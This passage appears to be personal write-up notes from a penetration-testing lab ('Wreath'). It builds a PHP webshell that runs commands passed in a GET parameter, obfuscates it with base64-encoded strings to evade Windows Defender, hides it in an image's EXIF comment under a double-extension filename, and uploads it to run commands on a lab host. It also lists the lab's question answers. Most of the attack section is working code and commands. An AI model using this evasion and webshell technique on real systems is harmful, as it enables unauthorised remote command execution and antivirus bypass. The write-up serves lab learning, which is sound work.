Now that we've covered the basic terminology, let's get back to hacking this PC!

We have an upload point which we can use to upload PHP scripts. We now need to figure out how to make a PHP script that will bypass the antivirus software. Windows Defender is free and comes pre-installed with Windows Server, so let's assume that this is what is in use for the time being.  

The solution is this:  
We build a payload that does what we need it to do (preferably in a slightly less than common way), then we obfuscate it either manually or by using one of the many tools available online.

First up, let's build that payload:  

```
<?php       
$cmd = $_GET["wreath"];       
if(isset($cmd)){           
	echo "<pre>" . shell_exec($cmd) . "</pre>";
}
die();
?>
```

Here we check to see if a GET parameter called "wreath" has been set. If so, we execute it using `shell_exec()`, wrapped inside HTML `<pre>` tags to give us a clean output. We then use `die()` to prevent the rest of the image from showing up as garbled text on the screen.  

This is slightly longer than the classic PHP one-liner webshell (`<?php system($_GET["cmd"]);?>`) for two reasons:

1. If we're obfuscating it then it will become a one-liner anyway
2. Anything _different_ is good when it comes to AV evasion

We now need to obfuscate this payload.

There are a variety of measures we could take here, including but not limited to:

- Switching parts of the exploit around so that they're in an unusual order
- Encoding all of the strings so that they're not recognisable.
- Splitting up distinctive parts of the code (e.g. `shell_exec($_GET[...])`)


---

Manual obfuscation is very much a thing, but for the sake of simplicity, let's just use one of the available online tools. The tool linked [here](https://www.gaijin.at/en/tools/php-obfuscator) is recommended. When it comes to web obfuscation, these tools are generally used to make the code difficult for humans to read; however, by doing things like obfuscating variable/function names and encoding strings, they also prove effective against antivirus software.  

Stick the payload into the tool, then activate all the obfuscation options:![[bb2ef4375625.webp]]

Click the "Obfuscate Source Code" button, and we're left with this mess of PHP:  
`<?php $p0=$_GET[base64_decode('d3JlYXRo')];if(isset($p0)){echo base64_decode('PHByZT4=').shell_exec($p0).base64_decode('PC9wcmU+');}die();?>`  

If you look closely you'll see that this is still very much the same payload as before; however, enough has changed that it _should_ fool Defender.

As this is getting passed into a bash command, we will need to escape the dollar signs to prevent them from being interpreted as bash variables. This means our final payload is as follows:  
`<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>`

With an obfuscated payload, we can now finalise our exploit.

Once again, make a copy of an innocent image (ensuring you give it a name in the format of `shell-USERNAME.jpeg.php`), then use `exiftool` to embed the payload into the image:  
`exiftool -Comment="<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>" shell-USERNAME.jpeg.php`


![[98a8bd99378c.webp]]

Upload your shell and attempt to access it!

If this worked then you should get an output similar to the following:

![[6b09145ae074.webp]]

Awesome! We have a shell.

We can now execute commands using the `wreath` GET parameter, e.g:  
`http://10.200.72.100/resources/uploads/shell-USERNAME.jpeg.php?wreath=systeminfo`

![[2920fdb4cd18.webp]]


---

> [!Question]
>1. What is the Host Name of the target?
>`WREATH-PC`
>2. What is our current username (include the domain in this)? 
>`wreath-pc\thomas`


**Next step: ** [[Compiling Netcat & Reverse Shell!]]

